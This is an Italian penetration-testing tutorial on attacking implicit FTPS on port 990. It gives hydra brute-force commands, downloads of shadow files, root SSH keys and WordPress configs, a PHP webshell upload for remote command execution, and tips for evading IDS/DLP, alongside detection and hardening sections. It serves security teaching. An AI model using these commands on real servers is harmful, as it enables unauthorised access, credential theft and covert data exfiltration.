---
title: 'Porta 990 FTPS: anonymous login, brute force e file exfiltration su FTP cifrato.'
slug: porta-990-ftps
description: 'Scopri cos’è la porta 990 ftps, come si collega alla 989 ftps-data e perché anonymous login, credenziali deboli e backup esposti restano i rischi principali del file transfer protetto da TLS.'
image: /porta-990-ftps.webp
draft: true
date: 2026-04-09T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - anonymous-login
  - ftps-implicit
---

> **Executive Summary** — La porta 990 è il canale di controllo FTPS (FTP over implicit TLS), la versione cifrata di FTP dove il TLS si stabilisce prima di qualsiasi comando. A differenza di FTPS explicit (STARTTLS sulla porta 21), la 990 non è vulnerabile a TLS stripping — ma le credenziali deboli, l'anonymous login e i permessi di accesso errati restano i vettori di attacco principali. Questa guida copre enumerazione, brute force, anonymous access, TLS inspection e file exfiltration.

```id="e9s6vq"
TL;DR

- FTPS sulla porta 990 è FTP con TLS implicito — nessun rischio STARTTLS downgrade, ma le credenziali deboli restano il problema principale
- Anonymous login su FTPS funziona esattamente come su FTP plain — se abilitato, accedi senza credenziali
- I server FTPS spesso espongono backup, configurazioni e file sensibili — il canale cifrato rende l'exfiltration invisibile a IDS/DLP

```

Porta 990 FTPS è il canale di controllo TCP del protocollo FTP over implicit TLS. La porta 990 vulnerabilità principali sono le credenziali deboli (spesso account di servizio per backup automatici), l'anonymous login non disabilitato e i file sensibili accessibili senza restrizioni. L'enumerazione porta 990 rivela il software FTP, la versione, la configurazione TLS e i file disponibili. Nel FTPS pentest, la cifratura protegge il canale ma non compensa credenziali deboli o permessi errati. Nella kill chain si posiziona come information disclosure (file sensibili) e come initial access (credenziali → accesso sistema).

## 1. Anatomia Tecnica della Porta 990

La porta 990 è registrata IANA come `ftps`. FTPS implicit usa TLS dal primo byte della connessione — non c'è una fase in chiaro.

| Modalità          | Porta controllo | Porta dati      | TLS           | Rischio downgrade |
| ----------------- | --------------- | --------------- | ------------- | ----------------- |
| FTP plain         | 21              | 20              | No            | N/A               |
| FTPS Explicit     | 21 (+ STARTTLS) | 20 (+ STARTTLS) | Dopo comando  | **Sì**            |
| **FTPS Implicit** | **990**         | **989**         | **Immediato** | **No**            |
| SFTP              | 22              | 22              | SSH           | No                |

Il flusso FTPS implicit:

1. Client si connette alla porta 990 → TLS handshake immediato
2. Dopo TLS: client invia `USER` + `PASS` (cifrato)
3. Comandi FTP normali: `LIST`, `CWD`, `RETR`, `STOR` — tutto cifrato
4. Per il trasferimento dati: porta 989 o passive mode su porta alta

I server FTPS più comuni: vsftpd, ProFTPD, FileZilla Server, Pure-FTPd, IIS FTP.

```
Misconfig: Anonymous login abilitato su FTPS
Impatto: accesso senza credenziali — listing e download di file condivisi
Come si verifica: lftp -u anonymous,anon ftps://[target]:990
```

```
Misconfig: Account di servizio con password debole
Impatto: accesso completo ai file — spesso backup con credenziali
Come si verifica: hydra -l backup -P common.txt ftps://[target]:990
```

```
Misconfig: Directory di backup esposta senza restrizioni
Impatto: download di shadow, database dump, chiavi SSH, configurazioni
Come si verifica: lftp -u user,pass ftps://[target]:990 -e "ls -la /"
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 990 10.10.10.70
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
990/tcp open  ftps    vsftpd 3.0.5
| ssl-cert: Subject: CN=ftp.corp.local
|   Issuer: CN=Let's Encrypt Authority X3
|   Not valid after: 2026-06-15
| ssl-enum-ciphers:
|   TLSv1.3:
|     ciphers:
|       TLS_AES_256_GCM_SHA384 - A
```

**Cosa ci dice questo output:** vsftpd 3.0.5 con certificato Let's Encrypt (non self-signed — buona pratica). TLS 1.3 con cipher A-grade. La versione vsftpd è importante per CVE matching.

### Comando 2: TLS inspection

```bash
openssl s_client -connect 10.10.10.70:990
```

**Output atteso:**

```
CONNECTED(00000003)
---
Protocol  : TLSv1.3
Cipher    : TLS_AES_256_GCM_SHA384
---
220 Welcome to Corp FTP Service
```

**Cosa ci dice questo output:** dopo il TLS handshake, il banner FTP è visibile. "Welcome to Corp FTP Service" — banner personalizzato che conferma un servizio enterprise.

## 3. Enumerazione Avanzata

### Anonymous login test

```bash
lftp ftps://10.10.10.70:990 -e "set ssl:verify-certificate no; login anonymous anonymous; ls; quit"
```

**Output (anonimo funzionante):**

```
drwxr-xr-x   2 ftp ftp     4096 Jan 15 pub/
drwxr-xr-x   2 ftp ftp     4096 Dec 01 incoming/
-rw-r--r--   1 ftp ftp    10240 Jan 15 README
```

**Output (anonimo bloccato):**

```
Login failed.
```

**Lettura dell'output:** anonymous attivo con directory `pub/` (lettura) e `incoming/` (potenzialmente writable). Per [upload di file malevoli](https://hackita.it/articoli/webshell) testa la scrittura su `incoming/`.

### File listing ricorsivo

```bash
lftp -u user,password ftps://10.10.10.70:990
lftp> set ssl:verify-certificate no
lftp> find / | head -50
```

**Output:**

```
/backup/
/backup/etc_shadow.bak
/backup/mysql_dump_20260201.sql.gz
/backup/id_rsa_root
/config/
/config/nginx.conf
/config/wp-config.php
/www/
/www/index.html
```

**Lettura dell'output:** backup con shadow, dump MySQL e chiave SSH root. Config con nginx.conf e wp-config.php (contiene credenziali database WordPress). Target primari per il download. Correla con la [guida alla porta 3306 MySQL](https://hackita.it/articoli/mysql) per accedere al database.

### Verifica permessi di scrittura

```bash
lftp -u user,password ftps://10.10.10.70:990
lftp> set ssl:verify-certificate no
lftp> put /tmp/test.txt -o /incoming/test.txt
```

**Output (writable):**

```
test.txt uploaded
```

**Output (read-only):**

```
553 Could not create file.
```

## 4. Tecniche Offensive

**Brute force credenziali FTPS**

Contesto: server FTPS identificato. Testa credenziali comuni.

```bash
hydra -L users.txt -P /usr/share/wordlists/common.txt ftps://10.10.10.70:990 -t 4 -W 5
```

**Output (successo):**

```
[990][ftps] host: 10.10.10.70   login: backup   password: Backup2025!
```

**Output (fallimento):**

```
0 valid passwords found
```

**Cosa fai dopo:** con credenziali valide, accedi e scarica file sensibili. Testa le stesse credenziali su SSH (22), SMB (445) e altri servizi — il [password reuse](https://hackita.it/articoli/bruteforce) è molto comune per gli account di backup.

**Download file critici**

Contesto: accesso FTPS confermato. Scarica shadow, chiavi SSH e config.

```bash
lftp -u backup,Backup2025! ftps://10.10.10.70:990
lftp> set ssl:verify-certificate no
lftp> get /backup/etc_shadow.bak -o /tmp/shadow
lftp> get /backup/id_rsa_root -o /tmp/root_key
lftp> get /config/wp-config.php -o /tmp/wp-config.php
lftp> mirror /backup/ /tmp/full_backup/
```

**Cosa fai dopo:**

* Shadow: `hashcat -m 1800 shadow_hashes rockyou.txt`
* SSH key: `chmod 600 /tmp/root_key && ssh -i /tmp/root_key root@10.10.10.70`
* wp-config.php: estrai `DB_NAME`, `DB_USER`, `DB_PASSWORD` per accesso MySQL

**Upload webshell su www/**

Contesto: la directory `www/` è writable e corrisponde alla document root del web server.

```bash
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
lftp -u backup,Backup2025! ftps://10.10.10.70:990
lftp> put /tmp/shell.php -o /www/shell.php
```

**Output (successo):**

```
shell.php uploaded
```

**Cosa fai dopo:** accedi a `http://10.10.10.70/shell.php?c=id`. Se PHP è attivo, hai RCE. Per una reverse shell completa, consulta le [tecniche di post-exploitation](https://hackita.it/articoli/post-exploitation).

**Credential extraction da file di configurazione**

Contesto: hai scaricato wp-config.php e nginx.conf. Estrai credenziali.

```bash
grep -i "password\|passwd\|secret\|key\|token" /tmp/wp-config.php
```

**Output:**

```
define('DB_PASSWORD', 'W0rdPr3ss_DB_2026!');
define('AUTH_KEY', 'a1b2c3d4...');
define('SECURE_AUTH_KEY', 'e5f6g7h8...');
```

**Cosa fai dopo:** `W0rdPr3ss_DB_2026!` è la password del database MySQL. Connettiti: `mysql -h 10.10.10.70 -u wp_user -p'W0rdPr3ss_DB_2026!' wp_database`. Per accedere al [database MySQL da remoto](https://hackita.it/articoli/mysql), usa questa password.

## 5. Scenari Pratici di Pentest

### Scenario 1: Server backup FTPS

**Situazione:** server dedicato ai backup con FTPS sulla 990.

**Step 1:**

```bash
nmap -sV -p 990,989 10.10.10.70
```

**Step 2:**

```bash
lftp ftps://10.10.10.70:990 -e "set ssl:verify-certificate no; login anonymous anon; ls; quit"
# Se fallisce:
hydra -l backup -P passwords.txt ftps://10.10.10.70:990
```

**Step 3:**

```bash
lftp -u backup,found_pass ftps://10.10.10.70:990 -e "find /; quit"
```

**Se fallisce:**

* Causa: nessun anonymous, password forte
* Fix: cerca credenziali FTP in script di backup su altri server compromessi

**Tempo stimato:** 10-30 minuti

### Scenario 2: FTPS + FTP plain entrambi attivi

**Situazione:** porta 21 e 990 entrambe aperte sullo stesso server.

**Step 1:**

```bash
nmap -sV -sC -p 21,990 10.10.10.70
```

**Step 2:**

```bash
# Testa FTP plain prima — potrebbe avere anonymous
ftp 10.10.10.70
> USER anonymous
> PASS anonymous
> ls
```

**Step 3:**

```bash
# Se FTP plain funziona: documenta come finding critico (credenziali in chiaro)
# Se non funziona: prova FTPS con stesse credenziali
```

**Se fallisce:**

* Causa: anonymous disabilitato su entrambi
* Fix: brute force su FTP plain (21) è più veloce — nessun overhead TLS

**Tempo stimato:** 5-15 minuti

### Scenario 3: Compliance audit TLS

**Situazione:** verifica che FTPS sia configurato correttamente.

**Step 1:**

```bash
testssl.sh 10.10.10.70:990
```

**Step 2:**

```bash
# Verifica: TLS 1.2+ only, no cipher deboli, certificato valido
# Finding comuni: TLS 1.0 abilitato, cert scaduto, cipher CBC
```

**Tempo stimato:** 5-10 minuti

## 6. Attack Chain Completa

| Fase        | Tool    | Comando                           | Risultato           |
| ----------- | ------- | --------------------------------- | ------------------- |
| Recon       | nmap    | `nmap -sV -p 21,989,990`          | FTPS confermato     |
| TLS Audit   | testssl | `testssl.sh [target]:990`         | Qualità cifratura   |
| Anonymous   | lftp    | Login anonymous                   | Accesso senza creds |
| Brute Force | hydra   | `hydra ftps://[target]:990`       | Credenziali         |
| File Enum   | lftp    | `find /`                          | Mappa file          |
| Download    | lftp    | `mirror /backup/ /tmp/`           | File sensibili      |
| Crack       | hashcat | `hashcat -m 1800 shadow`          | Password sistema    |
| SSH Access  | ssh     | `ssh -i stolen_key root@[target]` | Shell root          |

## 7. Detection & Evasion

### Blue Team

* **FTP log**: login, comandi, file trasferiti — `/var/log/vsftpd.log`
* **IDS**: brute force su porta 990 (ma il contenuto è cifrato)
* **Anomaly**: download massivi in orari insoliti

### Evasion

```
Tecnica: Canale cifrato nasconde il contenuto
Come: FTPS implicit cifra tutto — IDS non vede quali file scarichi
Riduzione rumore: solo metadata (connessione, dimensione) visibili, non i nomi dei file
```

```
Tecnica: Singola sessione con download mirati
Come: una sessione, scarica solo i file critici — non mirror
Riduzione rumore: meno log, meno traffico, sessione più breve
```

## 8. Toolchain e Confronto

| Aspetto          | FTPS (990)          | FTP (21)            | SFTP (22)          | SCP (22) |
| ---------------- | ------------------- | ------------------- | ------------------ | -------- |
| TLS              | Implicit            | No                  | SSH                | SSH      |
| Brute force tool | hydra, medusa       | hydra, medusa       | hydra              | N/A      |
| Anonymous        | Possibile           | Possibile           | No                 | No       |
| IDS visibility   | Bassa (cifrato)     | Alta (chiaro)       | Bassa              | Bassa    |
| Firewall         | Complesso (2 porte) | Complesso (2 porte) | Semplice (1 porta) | Semplice |

## 9. Troubleshooting

| Errore                            | Causa                        | Fix                                                            |
| --------------------------------- | ---------------------------- | -------------------------------------------------------------- |
| `Certificate verification failed` | Cert self-signed             | `set ssl:verify-certificate no` in lftp                        |
| hydra `connection refused`        | hydra non supporta ftps      | Usa `medusa -M ftp -n 990` o `ncrack`                          |
| Passive mode failure              | Firewall blocca porte alte   | Forza active mode o verifica range porte                       |
| `530 Login incorrect`             | Credenziali errate           | Verifica case-sensitivity e charset                            |
| Timeout durante transfer          | NAT/firewall sul canale dati | Forza EPSV: `set ftp:ssl-force true; set ftp:passive-mode yes` |

## 10. FAQ

**D: Che differenza c'è tra FTPS implicit (990) e explicit (21)?**
R: Implicit: TLS subito sulla 990, nessun rischio downgrade. Explicit: FTP plain sulla 21 con upgrade STARTTLS — vulnerabile a stripping attack dove un MitM rimuove il comando STARTTLS.

**D: FTPS o SFTP — quale è meglio?**
R: SFTP. Una singola porta (22), nessun problema di canale dati separato, cifratura SSH robusta. FTPS richiede gestione certificati, firewall per due porte e ha il rischio downgrade su explicit.

**D: Come proteggere FTPS sulla 990?**
R: Disabilita FTP plain (21). Disabilita anonymous. Password forti e account individuali. TLS 1.2+ con cipher forti. Chroot per limitare le directory. Log e monitoring.

## 11. Cheat Sheet Finale

| Azione         | Comando                                         |
| -------------- | ----------------------------------------------- |
| Scan           | `nmap -sV -p 21,989,990 [target]`               |
| TLS check      | `openssl s_client -connect [target]:990`        |
| Full TLS audit | `testssl.sh [target]:990`                       |
| Anonymous test | `lftp -u anonymous,anon ftps://[target]:990`    |
| Brute force    | `hydra -l user -P wordlist ftps://[target]:990` |
| Connect        | `lftp -u user,pass ftps://[target]:990`         |
| Find all files | `lftp> find /`                                  |
| Download file  | `lftp> get /path/file -o /tmp/`                 |
| Mirror dir     | `lftp> mirror /remote/ /local/`                 |
| Upload         | `lftp> put local_file -o /remote/path/`         |
| Write test     | `lftp> put test.txt -o /incoming/test.txt`      |

### Perché Porta 990 è rilevante nel 2026

FTPS è ancora usato per backup automatici, scambio file B2B e compliance PCI-DSS. Server FTPS con credenziali deboli e directory di backup espongono shadow, chiavi SSH e database dump. La cifratura TLS rende l'exfiltration invisibile a IDS/DLP — un vantaggio per l'attacker e un problema per il difensore.

### Hardening

* Disabilita FTP plain (porta 21) completamente
* Disabilita anonymous login
* TLS 1.2+ con cipher AEAD
* Chroot utenti nelle proprie directory
* Account individuali con password forti — no account condivisi
* Log centralizzati con alert su accessi anomali

### OPSEC

FTPS cifra tutto — IDS non vede il contenuto. Il brute force genera log. Download mirato è meno visibile di mirror completo. Se hai credenziali da altrove (config, breach), usale direttamente senza brute force. Approfondimento: [https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=990](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=990)

***

Riferimento: RFC 4217, RFC 959. Uso esclusivo in ambienti autorizzati.

> Vuoi supportare HackIta? [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
